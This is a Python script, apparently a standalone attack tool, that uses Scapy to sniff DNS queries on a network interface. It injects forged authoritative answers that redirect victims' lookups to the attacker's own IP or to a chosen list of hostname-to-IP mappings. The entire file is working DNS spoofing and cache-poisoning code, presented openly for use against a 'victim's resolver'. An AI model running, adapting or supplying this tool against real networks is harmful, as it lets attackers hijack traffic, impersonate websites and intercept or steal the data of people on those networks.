# library imports
from scapy.all import Ether, IP, UDP, DNS, DNSRR, sniff, sendp

# system imports
import argparse
import os
import socket

parser = argparse.ArgumentParser(
    description = "[Info] Captures network traffic and attempts to inject forged \
        responses to poison the cache of a victim's resolver."
)

poison_ips = {} # dictionary of poison_ips mapped to hostnames to spoof

poison_ip = ""
interface = "eth0" # default interface

def main():
    setup_args()

    args = parser.parse_args()
    run(args)

def setup_args():
    """ Sets up positional and optional arguments for command-line usage. """
    parser.add_argument('-i', metavar='interface', help='the network device to listen to')
    parser.add_argument('-f', metavar='hostnames', help='a list of IP addresses and hostname pairs specifying the hostnames to be hijacked')
    parser.add_argument('expression', help='a BPF filter that specifies a subset of the traffic to be monitored', nargs='?')

def run(args):
    print_run_msg(args)
    
    update_poison_ips(args)

    global poison_ip
    poison_ip = get_local_ip()

    global interface
    interface = args.i if args.i else interface

    bpf_filter = str.lower(args.expression) if args.expression else None

    sniff(iface = interface, filter=bpf_filter, prn=dns_poisonf if poison_ips else dns_poison, store=0)

def update_poison_ips(args):
    if args.f:
        try:
            open(args.f)
        except FileNotFoundError:
            print("Invalid file, '{file_name}'.".format(file_name=args.f))
            exit(1)

        with open(args.f) as fd:
            for line in fd:
                line = line.strip().split()
                poison_ips[line[1]] = line[0]

def dns_poison(pkt):
    if not pkt.haslayer(DNS) or not pkt.haslayer(UDP) or not pkt.haslayer(IP) or not pkt.haslayer(Ether): return
    if pkt[DNS].qr != 0 or pkt[DNS].qd.qtype == "AAAA": return

    # generate new checksums to indicate packet was not modified
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[UDP].len
    del pkt[UDP].chksum
    
    # switch Ether 
    pkt[Ether].src, pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src

    # switch IP
    pkt[IP].src, pkt[IP].dst = pkt[IP].dst, pkt[IP].src

    # switch UDP
    pkt[UDP].sport, pkt[UDP].dport = pkt[UDP].dport, pkt[UDP].sport

    # edit DNS -> spoofed response
    pkt[DNS].qr = 1
    pkt[DNS].aa = 1
    pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, type="A", rdata=poison_ip)
    pkt[DNS].ancount = 1

    sendp(pkt, iface=interface, verbose=0)

def dns_poisonf(pkt):
    if not pkt.haslayer(DNS) or not pkt.haslayer(UDP) or not pkt.haslayer(IP) or not pkt.haslayer(Ether): return
    if pkt[DNS].qr != 0 or pkt[DNS].qd.qtype != 1: return

    qname = pkt[DNS].qd.qname # get the domain name queried
    domain = qname[:-1].decode('utf-8') # remove the extra '.' at the end

    if domain not in poison_ips: return

    # generate new checksums to indicate packet was not modified
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[UDP].len
    del pkt[UDP].chksum
    
    # switch Ether 
    pkt[Ether].src, pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src

    # switch IP
    pkt[IP].src, pkt[IP].dst = pkt[IP].dst, pkt[IP].src

    # switch UDP
    pkt[UDP].sport, pkt[UDP].dport = pkt[UDP].dport, pkt[UDP].sport

    # edit DNS -> spoofed response
    pkt[DNS].qr = 1
    pkt[DNS].aa = 1
    pkt[DNS].an = DNSRR(rrname=qname, type="A", ttl=30, rdata=poison_ips[domain])
    pkt[DNS].ancount = 1

    sendp(pkt, iface=interface, verbose=0)

def print_run_msg(args):
    """ Print an appropriate run message based on the flags specified. """
    uses_interface = args.i
    uses_hostnames = args.f
    uses_filter = args.expression

    run_msg = "Listening on default interface, '{interface}'...".format(interface=args.i if uses_interface else 'eth0')
    
    if uses_interface:
        run_msg = run_msg.replace('default ', '')

    options = []
    if uses_hostnames:
        options.append("hostnames='{hostnames}'".format(hostnames=args.f))

    if uses_filter:
        options.append("filter='{filter}'".format(filter=args.expression))

    run_msg = run_msg + " (" + ", ".join(options) + ")"

    print(run_msg)

def get_local_ip():
    local_ip = ""

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "0.0.0.0"
    
    return local_ip
    
if __name__ == '__main__':
    main()